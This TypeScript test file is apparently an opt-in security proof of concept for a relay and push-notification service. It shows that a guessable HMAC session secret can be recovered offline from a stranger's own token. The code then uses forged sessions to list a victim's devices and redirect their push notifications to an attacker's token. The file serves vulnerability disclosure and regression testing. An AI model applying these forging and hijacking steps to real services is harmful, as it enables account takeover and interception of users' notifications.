import { createHmac, randomBytes } from 'node:crypto'
import { afterAll, beforeAll, expect, it } from 'vitest'
import { requestRelayAssignment } from '../../../../src/main/runtime/mobile-cloud-relay/director/relay-http-client'
import { RelayAssignRateGate } from '../../../../src/main/runtime/mobile-cloud-relay/director/relay-assign-rate-gate'
import { PushGatewayClient } from '../../../../src/main/runtime/push/push-gateway-client'
import { describePoc } from './poc-opt-in'
import {
  controlClient,
  enrolHost,
  hostSessionToken,
  newHostKeypair,
  postJson,
  startRelayUnderTest,
  type RelayUnderTest
} from './relay-attack-surface'

const WEAK_SECRET = 'changeme'
const GUESSES = ['', 'secret', 'password', 'seal', 'changeme', 'hunter2']

let relay: RelayUnderTest

function forgeSession(secret: string, hostFingerprint: string): string {
  const expiresAt = Date.now() + 60 * 60 * 1000
  const signature = createHmac('sha256', secret)
    .update(`seal-host-session/v1\0${hostFingerprint}\0${expiresAt}`)
    .digest('base64url')
  return `${hostFingerprint}.${expiresAt}.${signature}`
}

/** An enrolled stranger holds a valid token for its own key: a known message/MAC pair to test guesses on, offline. */
function recoverSecret(ownToken: string): string | null {
  const [fingerprint, expiresAt, signature] = ownToken.split('.')
  return (
    GUESSES.find(
      (guess) =>
        createHmac('sha256', guess)
          .update(`seal-host-session/v1\0${fingerprint}\0${expiresAt}`)
          .digest('base64url') === signature
    ) ?? null
  )
}

describePoc('PoC SR-06: nothing validates HOST_SESSION_SECRET, and it is the only gate on the push API', () => {
  beforeAll(async () => {
    relay = await startRelayUnderTest({ HOST_SESSION_SECRET: WEAK_SECRET })
  })
  afterAll(async () => {
    await relay?.dispose()
  })

  it('a stranger recovers a guessable secret offline, then reads and hijacks the victim push devices', async () => {
    const victimKeys = newHostKeypair()
    const victimPush = new PushGatewayClient({ gatewayUrl: relay.origin, keypair: victimKeys })
    const victimToken = `fcm:${randomBytes(24).toString('base64url')}`
    const registered = await victimPush.registerDevice({
      deviceId: 'victim-phone',
      platform: 'android',
      token: victimToken
    })
    if (!registered.ok) {
      throw new Error(`register failed: ${registered.reason}`)
    }
    const victim = await enrolHost(relay.origin, victimKeys)

    const secret = recoverSecret(await hostSessionToken(relay.origin, newHostKeypair()))
    expect(secret).toBe(WEAK_SECRET)
    const forged = { authorization: `Bearer ${forgeSession(secret!, victim.relayHostId)}` }

    const listed = await fetch(`${relay.origin}/v1/devices`, { headers: forged })
    expect(await listed.json()).toEqual({
      devices: [
        {
          registrationId: registered.registrationId,
          deviceId: 'victim-phone',
          platform: 'android',
          dead: false
        }
      ]
    })

    // Same deviceId keeps the registration id the victim's desktop sends to, but swaps the token.
    const attackerToken = `fcm:${randomBytes(24).toString('base64url')}`
    const swapped = await postJson(
      `${relay.origin}/v1/devices`,
      { v: 1, deviceId: 'victim-phone', platform: 'android', token: attackerToken },
      forged
    )
    expect(await swapped.json()).toEqual({ registrationId: registered.registrationId })

    relay.providers.respond((request) =>
      request.path.startsWith('/oauth2.googleapis.com/token')
        ? { status: 200, body: JSON.stringify({ access_token: 'google-access', expires_in: 3600 }) }
        : { status: 200, body: '{}' }
    )
    await victimPush.send({
      registrationIds: [registered.registrationId],
      notification: {
        notificationSeq: 1,
        notificationEpoch: 'e',
        source: 'agent-task-complete',
        agentState: 'needs-input',
        title: 'Claude needs input',
        body: 'Deploy to production? (y/n)'
      }
    })
    const delivered = JSON.parse(relay.providers.requests.at(-1)!.body).message
    expect(delivered.token).toBe(attackerToken)
    expect(delivered.data.message).toBe('Deploy to production? (y/n)')

    // Limit of the blast radius: the forged session mints a relay token for the victim's host id,
    // but the control seat still needs the victim's X25519 secret key.
    const minted = await postJson(
      `${relay.origin}/v1/host/relay-token`,
      { relayHostId: victim.relayHostId, hostPublicKeyB64: victimKeys.publicKeyB64 },
      forged
    )
    expect(minted.status).toBe(200)
    const { relayToken } = (await minted.json()) as { relayToken: string }
    const assignment = await requestRelayAssignment({
      directorUrl: relay.origin,
      relayToken,
      relayHostId: victim.relayHostId,
      assignRateGate: new RelayAssignRateGate()
    })
    const impostor = controlClient({
      cellUrl: assignment.cellUrl,
      relayToken,
      relayHostId: victim.relayHostId,
      assignmentEpoch: assignment.assignmentEpoch,
      keypair: { ...newHostKeypair(), publicKey: victimKeys.publicKey, publicKeyB64: victimKeys.publicKeyB64 }
    })
    await expect(impostor.connect()).rejects.toThrow()
    impostor.closeNow()
    await victim.stop()
  })
})
